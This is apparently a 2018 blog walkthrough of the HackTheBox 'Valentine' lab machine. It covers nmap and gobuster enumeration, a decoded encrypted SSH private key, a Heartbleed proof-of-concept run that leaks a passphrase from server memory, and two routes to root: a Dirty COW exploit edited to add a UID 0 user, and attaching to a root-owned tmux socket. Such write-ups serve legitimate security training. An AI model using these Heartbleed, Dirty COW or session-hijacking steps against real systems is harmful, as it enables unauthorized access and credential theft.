---
layout: post
title: "HackTheBox - Valentine writeup"
subtitle: "~ Walkthrough of Valentine machine from HackTheBox ~"
date: 2018-07-29
author: V3ded
category: CTF
tags: blog ctf pentesting hackthebox
finished: true
excerpt_separator: <!--more-->
---
<img src="/img/blog/htb-valentine/htb-valentine-00.png" width="417" height="136">

# Introduction
New day, new writeup! Today it's going to be Valentine from [HackTheBox](https://www.hackthebox.eu/){:target="_blank"}. This box, as its name indirectly implies, will be vulnerable to the [heartbleed bug](http://heartbleed.com/){:target="_blank"} (some deep detective work right there, duh). Without further ado, let's start! <!--more-->

***

# Scanning & Enumeration
As always, launch an nmap scan:

```console
root@EdgeOfNight:~# nmap 10.10.10.79 -sS -T4 -sC -sV

Starting Nmap 7.60 ( https://nmap.org ) at 2018-07-27 16:41 BST
Warning: 10.10.10.79 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.79
Host is up (0.043s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2018-07-27T15:42:08+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.00 seconds

```

Now do another nmap, this time one which searches for vulnerabilities in the SSL:
```console
root@EdgeOfNight:~# nmap 10.10.10.79 -sS -T4 -sV --script vuln -p 443

Starting Nmap 7.60 ( https://nmap.org ) at 2018-07-27 16:43 BST
Nmap scan report for 10.10.10.79
Host is up (0.043s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.cvedetails.com/cve/2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://www.openssl.org/news/secadv_20140407.txt 
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  OSVDB:113251
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       http://osvdb.org/113251
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_sslv2-drown: 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.85 seconds
```
There's plenty, right? Second scan confirms that this machine is indeed vulnerable to heartbleed, which allows the attacker (*us*) to leak memory from the target. 

As for web enumeration itself, we are present with this image upon visiting HTTP or HTTPS variant of the webpage:

<a href="/img/blog/htb-valentine/htb-valentine-01.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-valentine/htb-valentine-01.png"></a>

Just a plain image. Nothing less, nothing more! Since there are no other options, bruteforcing directories is a way to go. Run gobuster or any particular tool you use for directory enumeration: 
```console
root@EdgeOfNight:~# gobuster -u http://10.10.10.79 -w /usr/share/wordlists/dirb/big.txt -t 30 -e

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.79/
[+] Threads      : 30
[+] Wordlist     : /usr/share/wordlists/dirb/big.txt
[+] Status codes : 307,200,204,301,302
[+] Expanded     : true
=====================================================
http://10.10.10.79/decode (Status: 200)
http://10.10.10.79/dev (Status: 301)
http://10.10.10.79/encode (Status: 200)
http://10.10.10.79/index (Status: 200)
=====================================================

```
`/encode` and `/decode` files are just base64 encoder and decoder respectively. `/dev` however, is a lot more interesting. It's a directory which has file indexing enabled and shows 2 files:
<a href="/img/blog/htb-valentine/htb-valentine-02.png" target="_blank"><img class="centerImgSmall" src="/img/blog/htb-valentine/htb-valentine-02.png"></a>

Both files are listed below.
<figure>
<a href="/img/blog/htb-valentine/htb-valentine-02.png" target="_blank"><img class="centerImgSmall" src="/img/blog/htb-valentine/htb-valentine-02,5.png"></a>
<figcaption>Notes.txt</figcaption>
</figure>

<figure>
<a href="/img/blog/htb-valentine/htb-valentine-03.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-valentine/htb-valentine-03.png"></a>
<figcaption>Hype_key</figcaption>
</figure>

### - Notes.txt 
This file shows few concerns. One of the major ones being point number 4 - `Make sure encoding/decoding is only done client-side.` This means that our input is handled by the server (possibly some PHP code?). Because it happens **ON** the server, the PHP code is saved into memory for a brief period of time. It would be a shame if we could leak other people's encode / decode requests because of heartbleed, right? Moving on...


### - Hype_key
Looks like this text is hex encoded. You can make a simple python script for the decoding or use a webpage such as [rapidtables](https://www.rapidtables.com/convert/number/hex-to-ascii.html){:target="_blank"}. After decoding the text we get a private encrypted SSH key:

```console
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```
I tried to crack this encryption with **ssh2john** and **hashcat**, but failed. Probably not the indended solution.

***

# Exploitation
With all enumeration out of the way, let's piece our information together and see if we can get a shell. There is plenty PoC exploits for heartbleed, so it matters not which one you use. I sided with this [one](https://gist.github.com/eelsivart/10174134){:target="_blank"}.

```console
root@EdgeOfNight:~# python expl.py 10.10.10.79

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#..........~.41.Mk....S......k.7..h....VyA...q

```
In this attempt we didn't get anything valuable, BUT if you do some encode / decode requests, you should be able to see your own data in this memory leak. More importantly, if you are lucky enough you will win a golden prize!

```console
root@EdgeOfNight:~# python expl.py 10.10.10.79

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==8....=...P '{..m$C.3

```
Decode the base64 encoded text:
```console
root@EdgeOfNight:~# echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
heartbleedbelievethehype
```

As it turns out, `heartbleedbelievethehype` is the decryption phrase to the previously found SSH key. Armed with this knowledge, all we need to guess now is the username to the SSH key. Luckily, that isn't hard either. Check the name of the file where the hex key was previously stored - <b>Hype</b>_key. We can therefore safely guess that the username this SSH key belongs to is **hype**.

Therefore `ssh -i hype.key hype@10.10.10.79` will succesfully authenticate us after providing the decryption phrase.  

<a href="/img/blog/htb-valentine/htb-valentine-04.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-valentine/htb-valentine-04.png"></a>

**Go and get your user flag!** 

***

# Privilege Escalation
I dropped in an [enumeration](https://github.com/rebootuser/LinEnum){:target="_blank"} script as usual (I will not include the output in my blog as it is way too long) and found out that the kernel is very outdated - `Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux`. Outdated so much that it is vulnerable to [Dirty C0w](https://dirtycow.ninja/){:target="_blank"}. There are multiple exploits for this particular vulnerability. I will be using [one](https://github.com/FireFart/dirtycow/blob/master/dirty.c){:target="_blank"} made by [firefart](https://github.com/FireFart){:target="_blank"}. This exploit creates a user of our choice, and adds him into */etc/passwd* file as a user with UID and GID 0 - effectively giving him root privileges. 

Make sure you edit line 131+ so that you make your own user:
{% highlight c++ %}
  user.username = "v3ded";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";
{% endhighlight %}

After that just compile the exploit with required flags, transfer it onto the machine (or compile it there directly) and run it. If all goes smoothly the exploit should finish without any issues. 

<a href="/img/blog/htb-valentine/htb-valentine-05.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-valentine/htb-valentine-05.png"></a>

> Note: Dirty C0w is a race condition exploit and therefore you might have to wait for some time until the exploit successfuly completes.

Anyways, now just *su* as the user you created with the password you were prompted for (in my case "v3ded:v3ded"). You should find out that you are root (UID=0, GID=0).

<a href="/img/blog/htb-valentine/htb-valentine-06.png" target="_blank"><img class="centerImgSmall" src="/img/blog/htb-valentine/htb-valentine-06.png"></a>

### - Privilege Escalation #2
After finishing this blog it was brought to my attention by my friend, [Filip](https://twitter.com/filip_dragovic){:target="_blank"}, that there is also another way to root this machine. Kernel exploits (like as this one), should always be kept as a last resort in case there are *absolutely* no other means of escalating privileges. The reason is, that such exploits can often crash the kernel or make the machine unstable which is something we don't want in a real life environment. Hence, I'll show you the second (probably intended) method as well. 

Second method requires just some determination to read through long output in your terminal. View all the running root processes with `ps aux | grep root`:
```console
hype@Valentine:~$ ps aux | grep root
[REDACTED FOR READABILITY]
root         25  0.0  0.0      0     0 ?        S    05:57   0:00 [fsnotify_mark]
root         26  0.0  0.0      0     0 ?        S    05:57   0:00 [ecryptfs-kthrea]
root         27  0.0  0.0      0     0 ?        S<   05:57   0:00 [crypto]
root         35  0.0  0.0      0     0 ?        S<   05:57   0:00 [kthrotld]
[REDACTED FOR READABILITY]
root         60  0.0  0.0      0     0 ?        S<   05:57   0:00 [devfreq_wq]
root         96  0.0  0.0      0     0 ?        S    05:57   0:00 [scsi_eh_2]
root         97  0.0  0.0      0     0 ?        S<   05:57   0:00 [vmw_pvscsi_wq_2]
root        217  0.0  0.0      0     0 ?        S    05:57   0:00 [jbd2/sda1-8]
root        218  0.0  0.0      0     0 ?        S<   05:57   0:00 [ext4-dio-unwrit]
root        317  0.0  0.0  17356   640 ?        S    05:57   0:00 upstart-udev-bridge --daemon
root        320  0.0  0.1  21876  1712 ?        Ss   05:57   0:00 /sbin/udevd --daemon
[REDACTED FOR READABILITY]
root        905  0.0  0.2  49952  2856 ?        Ss   05:58   0:00 /usr/sbin/sshd -D
root        993  0.0  0.0  19976   968 tty4     Ss+  05:58   0:00 /sbin/getty -8 38400 tty4
root       1003  0.0  0.0  19976   968 tty5     Ss+  05:58   0:00 /sbin/getty -8 38400 tty5
root       1007  0.0  0.1  26416  1672 ?        Ss   05:58   0:00 /usr/bin/tmux -S /.devs/dev_sess
root       1011  0.0  0.0  19976   980 tty2     Ss+  05:58   0:00 /sbin/getty -8 38400 tty2
[REDACTED FOR READABILITY]
```
This is only portion of the normal output. A clever eye might notice a process with PID of 1007 - `/usr/bin/tmux -S /.devs/dev_sess`. This is an active tmux session owned by **root**. [Wikipedia](https://en.wikipedia.org/wiki/Tmux){:target="_blank"} describes tmux with these words: "tmux is a terminal multiplexer, allowing a user to access multiple separate terminal sessions inside a single terminal window or remote terminal session". Simply said, it's just another type of shell! Anyone can attach to this shell using the following command - `tmux -S /.devs/dev_sess`. Once you drop into the shell, you will be root.

<a href="/img/blog/htb-valentine/htb-valentine-07.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-valentine/htb-valentine-07.png"></a>

**Congratulations!** You rooted Valentine! Now go and get that juicy flag ;).

***

# Conclusion
Thank you for reading untill the end! And thank you [mrb3n](www.mrb3n.com){:target="_blank"} for creating this machine! That's all for now, I hope to see you in another one of my blogposts soon. 

~V3
